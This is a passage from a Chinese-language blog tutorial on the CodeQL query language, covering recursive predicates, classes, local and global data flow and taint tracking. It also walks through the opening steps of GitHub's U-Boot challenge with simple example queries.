<p>谓词的传递闭包是递归谓词，它的结果是通过重复应用原始的谓词来获得的。</p>
<p>特别要注意的是，原始谓词必须有两个参数(可能包括this或result值)，并且这些参数必须具有兼容的类型。</p>
<p>由于传递闭包是递归的一种常见形式，因此QL有两个有用的缩写，分别是<code>+</code>和<code>*</code></p>
</blockquote>
<ul>
<li>
<p><strong>传递闭包(+)</strong></p>
<p>如果要一次或多次的应用特定谓词，请在谓词后添加一个<code>+</code>符号。</p>
<p>举个例子，假设定义了一个带有成员谓词<code>getAParent()</code>的<code>Person</code>类，其中<code>p.getAParent()</code>会返回p的所有父母。而<code>p.getAParent+()</code>将会返回p的父母、p的父母的父母、等等等等。</p>
<p>使用<code>+</code>来表示通常会比显式定义递归谓词更简单，<code>p.getAParent+()</code>等价于以下递归谓词：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">getAnAncestor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  result = <span class="keyword">this</span>.getAParent()</span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  result = <span class="keyword">this</span>.getAParent().getAnAncestor()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>自反传递闭包(*)</strong></p>
<p>这个类似于上面的传递闭包。与之前所不同的是，使用<code>*</code>可以让谓词调用自己一次至多次。</p>
<p>例如：<code>p.getAParent*()</code>将会输出p的祖先，或者p。该谓词调用等价于以下谓词:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">getAnAncestor2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  result = <span class="keyword">this</span></span><br><span class="line">  <span class="keyword">or</span></span><br><span class="line">  result = <span class="keyword">this</span>.getAParent().getAnAncestor2()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://help.semmle.com/QL/ql-handbook/predicates.html" target="_blank" rel="noopener">Predicates - QL language reference</a></p>
</blockquote>
<h3 id="2-类">2. 类</h3>
<ul>
<li>
<p>以上面ql中的各种类为例（例如Function类），这些类的设计将特定一类的代码归结为一处，以便于后续查询的使用。而如果我们需要自定义特定的类，那该怎么做呢？</p>
<blockquote>
<p>CodeQL中的类，<strong>并不意味着建立一个新的对象</strong>，而只是表示特定一类的数据集合，请注意区分。</p>
</blockquote>
</li>
<li>
<p>定义一个类，需要三个步骤</p>
<ul>
<li>
<p>使用关键字<code>class</code></p>
</li>
<li>
<p>起一个类名，其中类名必须是首字母大写的。</p>
</li>
<li>
<p>确定是从哪个类中派生出来的</p>
<blockquote>
<p>使用的基类，除了cpp包中定义的各种类以外，还包括基本类型，即<code>boolean</code>、<code>float</code>、<code>int</code>、<code>string</code>以及<code>date</code>。</p>
</blockquote>
</li>
<li>
<p>类的主体</p>
</li>
</ul>
</li>
<li>
<p>以下是一个简单的例子，这个例子是官方的一个样例。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OneTwoThree</span> <span class="title">extends</span> <span class="title">int</span> &#123;</span></span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="keyword">this</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">2</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">string</span> getAString() &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">"One, two or three: "</span> + <span class="keyword">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isEven() &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="keyword">this</span> in [<span class="number">1</span> .. <span class="number">2</span>] <span class="comment">// </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from OneTwoThree i </span><br><span class="line">where i = <span class="number">1</span> <span class="keyword">or</span> i.getAString() = <span class="string">"One, two or three: 2"</span></span><br><span class="line">select i</span><br><span class="line"><span class="comment">// 输出1和2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><strong>特征谓词</strong>类似于C++中的类构造函数，它将会进一步限制当前类所表示数据的集合。例如上面的特征谓词</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">  <span class="keyword">this</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">2</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>它将数据集合从原先的<code>Int</code>集，进一步限制至1-3这个范围。</p>
<p><code>this</code>变量表示的是当前类中所包含的数据集合。与<code>result</code>变量类似，<code>this</code>同样是用于表示数据集合直接的关系。</p>
</li>
<li>
<p>在特征谓词中，比较常用的一个关键字是<a href="https://help.semmle.com/QL/ql-handbook/formulas.html#exists" target="_blank" rel="noopener">exists</a>。该关键字的语法如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">exists(&lt;variable declarations&gt; | &lt;formula&gt;)</span><br><span class="line"><span class="comment">// 以下两个exists所表达的意思等价。</span></span><br><span class="line">exists(&lt;variable declarations&gt; | &lt;formula <span class="number">1</span>&gt; | &lt;formula <span class="number">2</span>&gt;</span><br><span class="line">exists(&lt;variable declarations&gt; | &lt;formula <span class="number">1</span>&gt; <span class="keyword">and</span> &lt;formula <span class="number">2</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这个关键字的使用引入了一些新的变量。如果变量中至少有一组值可以使formula成立，那么该值将被保留。</p>
<p>一个简单的例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkByteSwap</span> <span class="title">extends</span> <span class="title">Expr</span>&#123;</span></span><br><span class="line">    NetworkByteSwap()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对于MacroInvocation这个大类的数据集合来说，</span></span><br><span class="line">        exists(MacroInvocation mi |</span><br><span class="line">            <span class="comment">// 如果存在宏调用，其宏名称满足特定正则表达式</span></span><br><span class="line">            mi.getMacroName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>) <span class="keyword">and</span></span><br><span class="line">            <span class="comment">// 将这类数据保存至当前类中</span></span><br><span class="line">            <span class="keyword">this</span> = mi.getExpr()</span><br><span class="line">          )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from NetworkByteSwap n</span><br><span class="line">select n, <span class="string">"Network byte swap"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>与之对应的还有成员谓词，如下例所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OneTwoThree</span> <span class="title">extends</span> <span class="title">int</span> &#123;</span></span><br><span class="line">  OneTwoThree() &#123; <span class="comment">// characteristic predicate</span></span><br><span class="line">    <span class="keyword">this</span> = <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">2</span> <span class="keyword">or</span> <span class="keyword">this</span> = <span class="number">3</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">string</span> getAString() &#123; <span class="comment">// member predicate</span></span><br><span class="line">    result = <span class="string">"One, two or three: "</span> + <span class="keyword">this</span>.toString()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate isEven() &#123; <span class="comment">// member predicate</span></span><br><span class="line">    <span class="keyword">this</span> in [<span class="number">1</span> .. <span class="number">2</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">select <span class="number">1.</span>(OneTwoThree).getAString() <span class="comment">// 输出"One, two or three: 1"</span></span><br><span class="line"><span class="comment">//select 4.(OneTwoThree).getAString() // 无输出</span></span><br></pre></td></tr></table></figure>
<p>其中，<code>1.(OneTwoThree).getAString()</code>会将<code>int</code>类型的1转换为<code>OneTwoThree</code>类型。<strong>在转换的过程中会丢弃不满足<code>OneTwoThree</code>类中限定条件的数据</strong>。因此<code>4.(OneTwoThree).getAString()</code>将不会输出任何信息，因为整数4在转换的过程中被丢弃了。</p>
</li>
</ul>
</li>
<li>
<p>与C++类似，CodeQL中类里可以声明一个类字段，如下例所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SmallInt</span> <span class="title">extends</span> <span class="title">int</span> &#123;</span></span><br><span class="line">  SmallInt() &#123; <span class="keyword">this</span> = [<span class="number">1</span> .. <span class="number">10</span>] &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DivisibleInt extends SmallInt &#123;</span><br><span class="line">  SmallInt divisor;   <span class="comment">// declaration of the field `divisor`</span></span><br><span class="line">  DivisibleInt() &#123; <span class="keyword">this</span> % divisor = <span class="number">0</span> &#125;</span><br><span class="line"></span><br><span class="line">  SmallInt getADivisor() &#123; result = divisor &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DivisibleInt i</span><br><span class="line">select i, i.getADivisor()</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>需要注意的是，</p>
<ul>
<li>
<p>每个类都不能继承自己</p>
</li>
<li>
<p>不能继承final类</p>
</li>
<li>
<p>不能继承不相容的类</p>
<blockquote>
<p>这一点需要额外说明一下，从某个基类派生出的类，将拥有基类的所有数据集合范围。如果某个类继承了多个基类，那么<strong>该类内含的数据集合，将是两个基类数据集合的交集</strong>。</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://help.semmle.com/QL/ql-handbook/types.html#classes" target="_blank" rel="noopener">class - QL language reference</a></p>
</blockquote>
<h2 id="六、数据流分析与污点追踪">六、数据流分析与污点追踪</h2>
<blockquote>
<p>该部分内容主要 <s>参考</s> 翻译自：<a href="https://codeql.github.com/docs/codeql-language-guides/analyzing-data-flow-in-cpp/" target="_blank" rel="noopener">Analyzing data flow in C and C++ - CodeQL documentation</a></p>
<p>参考了<a href="https://codeql.github.com/docs/writing-codeql-queries/about-data-flow-analysis/#about-data-flow-analysis" target="_blank" rel="noopener">About data flow analysis</a>的部分内容</p>
</blockquote>
<ul>
<li>我们可以在CodeQL中，使用数据流分析来跟踪可能导致漏洞的潜在恶意数据流。</li>
<li>数据流分析可以分析出变量在程序中各节点上可能的值，并确定这些值如何在程序中传输以及使用方式。</li>
<li><strong>数据流</strong>分为两个部分：<strong>局部数据流</strong>以及<strong>全局数据流</strong></li>
</ul>
<h3 id="1-局部数据流">1. 局部数据流</h3>
<p><strong>局部数据流</strong>指的是在一个单独函数内的数据流。局部数据流比全局数据流分析的更加简单、迅速，同时也更加精确。</p>
<h4 id="a-使用局部数据流">a. 使用局部数据流</h4>
<ul>
<li>
<p>局部数据流的库函数主要位于<code>DataFlow</code>模块中。该模块定义了一个类<code>Class</code>，这个类用于表示数据可以流经的任何元素。</p>
</li>
<li>
<p>而<code>Node</code>类分为两种，分别是表达式节点<code>ExprNode</code>与参数节点<code>ParameterNode</code>。我们可以使用谓词<code>asExpr</code>与<code>asParameter</code>，将数据流结点与表达式节点/参数结点之间进行映射。</p>
<blockquote>
<p>注意：参数结点<code>ParameterNode</code>指的是<strong>当前函数参数</strong>的数据流结点。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="comment">/** Gets the expression corresponding to this node, if any. */</span></span><br><span class="line">  <span class="function">Expr <span class="title">asExpr</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Gets the parameter corresponding to this node, if any. */</span></span><br><span class="line">  <span class="function">Parameter <span class="title">asParameter</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者使用谓词<code>exprNode</code>以及<code>parameterNode</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to expression `e`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">ExprNode <span class="title">exprNode</span><span class="params">(Expr e)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the node corresponding to the value of parameter `p` at function entry.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">ParameterNode <span class="title">parameterNode</span><span class="params">(Parameter p)</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>谓词<code>localFlowStep(Node nodeFrom, Node nodeTo)</code>可以分析出从<code>nodeFrom</code>到<code>nodeTo</code>中的元素之间数据流动的方式。该谓词可以通过使用符号<code>+</code>和<code>*</code>来进行递归调用，或者使用预定义好的递归谓词<code>localFlow</code>。</p>
<p>以下是一个用于查找从参数<code>source</code>到表达式<code>sink</code>的例子</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="b-使用局部污点追踪">b. 使用局部污点追踪</h4>
<ul>
<li>
<p>局部污点追踪通过包括非保留值的流程步骤来扩展了局部数据流，例如以下C++代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = tainted_user_input();</span><br><span class="line">some_big_struct *<span class="built_in">array</span> = <span class="built_in">malloc</span>(i * <span class="keyword">sizeof</span>(some_big_struct));</span><br></pre></td></tr></table></figure>
<p>由于输出的变量<code>i</code>被污染，因此使用变量<code>i</code>的<code>malloc</code>函数参数也被污染。</p>
</li>
<li>
<p>局部污点追踪的库函数主要位于<code>TaintTracking</code>模块中。与局部数据流分析类似，污点追踪同样有谓词<code>localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</code>用于污点分析，同样有递归版本的<code>localTaint</code>谓词。</p>
<p>一个简单的例子，查找从参数<code>source</code>到表达式<code>sink</code>的污点传播。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="c-例子">c. 例子</h4>
<ul>
<li>
<p>这个例子是用于查找传入<code>fopen</code>函数的文件名称</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from Function fopen, FunctionCall fc</span><br><span class="line">where fopen.hasQualifiedName(<span class="string">"fopen"</span>)</span><br><span class="line">  <span class="keyword">and</span> fc.getTarget() = fopen</span><br><span class="line">select fc.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>但上面的ql代码只会将<strong>文件名参数</strong>的表达式输出，而这并不是可能传递给它的值。因此我们需要使用局部数据流分析来找到所有可流入该参数的表达式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Function fopen, FunctionCall fc, Expr src</span><br><span class="line">where fopen.hasQualifiedName(<span class="string">"fopen"</span>)</span><br><span class="line">  <span class="keyword">and</span> fc.getTarget() = fopen</span><br><span class="line">  <span class="keyword">and</span> DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(fc.getArgument(<span class="number">0</span>)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure>
<p>这样它将会输出可能流入<code>fopen</code>文件名参数的<strong>所有变量的表达式</strong>。</p>
<p>现在我们可以稍微将<code>source</code>改一下，将<code>exprNode</code>改成<code>parameterNode</code>，这样就可以查询出<strong>既是当前函数的参数，又可以作为<code>fopen</code>的文件名参数</strong>的表达式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line">from Function fopen, FunctionCall fc, Parameter p</span><br><span class="line">where fopen.hasQualifiedName(<span class="string">"fopen"</span>)</span><br><span class="line">  <span class="keyword">and</span> fc.getTarget() = fopen</span><br><span class="line">  <span class="keyword">and</span> DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(fc.getArgument(<span class="number">0</span>)))</span><br><span class="line">select p</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下这个例子将会查找<strong>格式字符串中没有被硬编码</strong>的格式化函数的调用。</p>
<blockquote>
<p>格式化函数包括但不限于各种<code>printf</code>函数。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.commons.Printf</span><br><span class="line"></span><br><span class="line">from FormattingFunction format, FunctionCall call, Expr formatString</span><br><span class="line">where call.getTarget() = format</span><br><span class="line">  <span class="keyword">and</span> call.getArgument(format.getFormatParameterIndex()) = formatString</span><br><span class="line">  <span class="keyword">and</span> <span class="keyword">not</span> exists(DataFlow::Node source, DataFlow::Node sink |</span><br><span class="line">    DataFlow::localFlow(source, sink) <span class="keyword">and</span></span><br><span class="line">    source.asExpr() instanceof StringLiteral <span class="keyword">and</span></span><br><span class="line">    sink.asExpr() = formatString</span><br><span class="line">  )</span><br><span class="line">select call, <span class="string">"Argument to "</span> + format.getQualifiedName() + <span class="string">" isn't hard-coded."</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="2-全局数据流">2. 全局数据流</h3>
<p>全局数据流跟踪整个程序的数据流，因此比局部数据流更强大。但全局数据流的准确性不如本地数据流，并且通常需要更多的时间和内存来执行分析。</p>
<h4 id="a-使用全局数据流">a. 使用全局数据流</h4>
<p>通过继承<code>DataFlow::Configuration</code>类来使用全局数据流库。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDataFlowConfiguration</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:Configuration &#123;</span><br><span class="line">  MyDataFlowConfiguration() &#123; <span class="keyword">this</span> = <span class="string">"MyDataFlowConfiguration"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>DataFlow::Configuration</code>类中定义了如下几个谓词：</p>
<ul>
<li><code>isSource</code>： <strong>定义数据可能从何处流出</strong></li>
<li><code>isSink</code>： <strong>定义数据可能流向的位置</strong></li>
<li><code>isBarrier</code>： 可选，限制数据流</li>
<li><code>isBarrierGuard</code>： 可选，限制数据流</li>
<li><code>isAdditionalFlowStep</code>： 可选，添加其他流程步骤</li>
</ul>
<p>在特征谓词<code>MyDataFlowConfiguration()</code>中定义了当前<code>Configuration</code>的名称，因此内部的<code>&quot;MyDataFlowConfiguration&quot;</code>需要替换成自己的名称。</p>
<p>使用谓词<code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>来执行全局数据流分析</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">from MyDataFlowConfiguration dataflow, DataFlow::Node source, DataFlow::Node sink</span><br><span class="line">where dataflow.hasFlow(source, sink)</span><br><span class="line">select source, <span class="string">"Data flow to $@."</span>, sink, sink.toString()</span><br></pre></td></tr></table></figure>
<h4 id="b-使用全局污点追踪">b. 使用全局污点追踪</h4>
<p>与局部污点追踪类似，全局污点追踪针对的是全局数据流。全局污点追踪通过其他不保留值的步骤来扩展了全局数据流。</p>
<p>通过继承<code>TaintTracking::Configuration</code>类以使用全局污点追踪的库函数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTaintTrackingConfiguration</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  MyTaintTrackingConfiguration() &#123; <span class="keyword">this</span> = <span class="string">"MyTaintTrackingConfiguration"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在配置中定义了以下谓词：</p>
<ul>
<li><code>isSource</code>：定义污点可能从何处流出</li>
<li><code>isSink</code>：定义污点可能流入的地方</li>
<li><code>isSanitizer</code>：可选，限制污点流</li>
<li><code>isSanitizerGuard</code>：可选，限制污点流</li>
<li><code>isAdditionalTaintStep</code>：可选，添加其他污染步骤</li>
</ul>
<p>使用谓词<code>hasFlow(DataFlow::Node source, DataFlow::Node sink)</code>以执行污点追踪分析。</p>
<h4 id="c-例子-2">c. 例子</h4>
<ul>
<li>
<p>以下数据流分析用于追踪<strong>从环境变量到打开文件</strong>的数据流</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.DataFlow</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EnvironmentToFileConfiguration</span> <span class="title">extends</span> <span class="title">DataFlow</span>:</span>:Configuration &#123;</span><br><span class="line">  EnvironmentToFileConfiguration() &#123; <span class="keyword">this</span> = <span class="string">"EnvironmentToFileConfiguration"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists (Function getenv |</span><br><span class="line">      source.asExpr().(FunctionCall).getTarget() = getenv <span class="keyword">and</span></span><br><span class="line">      getenv.hasQualifiedName(<span class="string">"getenv"</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall fc |</span><br><span class="line">      sink.asExpr() = fc.getArgument(<span class="number">0</span>) <span class="keyword">and</span></span><br><span class="line">      fc.getTarget().hasQualifiedName(<span class="string">"fopen"</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Expr getenv, Expr fopen, EnvironmentToFileConfiguration config</span><br><span class="line">where config.hasFlow(DataFlow::exprNode(getenv), DataFlow::exprNode(fopen))</span><br><span class="line">select fopen, <span class="string">"This 'fopen' uses data from $@."</span>,</span><br><span class="line">  getenv, <span class="string">"call to 'getenv'"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>以下污点追踪代码用于追踪从调用<code>ntohl</code>到操作数组索引的数据流。该代码使用<code>Guards</code>库以识别经过边界检查的表达式，同时还定义了谓词<code>isSanitizer</code>以避免污点分析经过特定数据，最后定义了<code>isAdditionalTaintStep</code>用于将流从边界循环添加至循环索引。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.controlflow.Guards</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NetworkToBufferSizeConfiguration</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  NetworkToBufferSizeConfiguration() &#123; <span class="keyword">this</span> = <span class="string">"NetworkToBufferSizeConfiguration"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node node) &#123;</span><br><span class="line">    node.asExpr().(FunctionCall).getTarget().hasGlobalName(<span class="string">"ntohl"</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node node) &#123;</span><br><span class="line">    exists(ArrayExpr ae | node.asExpr() = ae.getArrayOffset())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isAdditionalTaintStep(DataFlow::Node pred, DataFlow::Node succ) &#123;</span><br><span class="line">    exists(Loop loop, LoopCounter lc |</span><br><span class="line">      loop = lc.getALoop() <span class="keyword">and</span></span><br><span class="line">      loop.getControllingExpr().(RelationalOperation).getGreaterOperand() = pred.asExpr() |</span><br><span class="line">      succ.asExpr() = lc.getVariableAccessInLoop(loop)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    exists(GuardCondition gc, Variable v |</span><br><span class="line">      gc.getAChild*() = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">      node.asExpr() = v.getAnAccess() <span class="keyword">and</span></span><br><span class="line">      gc.controls(node.asExpr().getBasicBlock(), _)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::Node ntohl, DataFlow::Node offset, NetworkToBufferSizeConfiguration conf</span><br><span class="line">where conf.hasFlow(ntohl, offset)</span><br><span class="line">select offset, <span class="string">"This array offset may be influenced by $@."</span>, ntohl,</span><br><span class="line">  <span class="string">"converted data from the network"</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="七、CodeQL-U-Boot-Challenge">七、CodeQL U-Boot Challenge</h2>
<ul>
<li>
<p>纸上得来终觉浅，绝知此事要躬行。简单翻阅QL文档是学不到什么的，我们需要自己动手实践一下。</p>
<p>下面笔者将讲述github learning lab中，用于学习CodeQL的一个入门课程 - <a href="https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-(cc++)" target="_blank" rel="noopener">CodeQL U-Boot Challenge (C/C++)</a></p>
</li>
<li>
<p>Step1: 了解从何处获取帮助</p>
<ul>
<li><a href="https://lgtm.com/help/lgtm/console/ql-cpp-basic-example" target="_blank" rel="noopener">Writing a basic C++ Code QL query</a></li>
<li><a href="https://help.semmle.com/QL/learn-ql/introduction-to-ql.html" target="_blank" rel="noopener">Introduction to CodeQL</a></li>
<li><a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">Learning CodeQL</a></li>
</ul>
</li>
<li>
<p>Step2: 设置IDE</p>
<ul>
<li>下载VSCode以及CodeQL插件，还有CodeQL CLI文件。</li>
<li>下载<a href="https://github.com/github/vscode-codeql-starter/" target="_blank" rel="noopener">CodeQL starter</a>工作区</li>
<li>下载<a href="https://downloads.lgtm.com/snapshots/cpp/uboot/u-boot_u-boot_cpp-srcVersion_d0d07ba86afc8074d79e436b1ba4478fa0f0c1b5-dist_odasa-2019-07-25-linux64.zip" target="_blank" rel="noopener">U-Boot CodeQL database</a>并解压</li>
<li>克隆<a href="https://github.com/Kiprey/codeql-uboot" target="_blank" rel="noopener">当前github课程仓库</a></li>
<li>将当前课程仓库的文件夹添加至之前下载的VScode starter工作区，同时将之前下载的U-Boot数据库导入至VScode</li>
<li>一切就绪!</li>
</ul>
</li>
<li>
<p>Step3: 编写一个简单的查询。在这里我们用于查询<code>strlen</code>函数的定义位置。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() = <span class="string">"strlen"</span></span><br><span class="line">select f, <span class="string">"a function named strlen"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step4: 分析这个简单的查询，之后查询一下<code>memcpy</code>函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line">from Function f</span><br><span class="line">where f.getName() = <span class="string">"memcpy"</span></span><br><span class="line">select f, <span class="string">"a function named memcpy"</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step5: 使用不同的类以及不同的谓语。这里我们编写QL查找名为<code>ntohs</code>、<code>ntohl</code>以及<code>ntohll</code>的宏定义。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp </span><br><span class="line"></span><br><span class="line">from Macro macro</span><br><span class="line"><span class="comment">//where macro.getName() = "ntohs" or macro.getName() = "ntohl" or macro.getName() = "ntohll"</span></span><br><span class="line">where macro.getName().regexpMatch(<span class="string">"ntoh(s|l|ll)"</span>)</span><br><span class="line">select macro</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Step6: 使用双变量。通过使用多个变量来描述复杂的代码关系，查询特定函数的调用位置。</p>
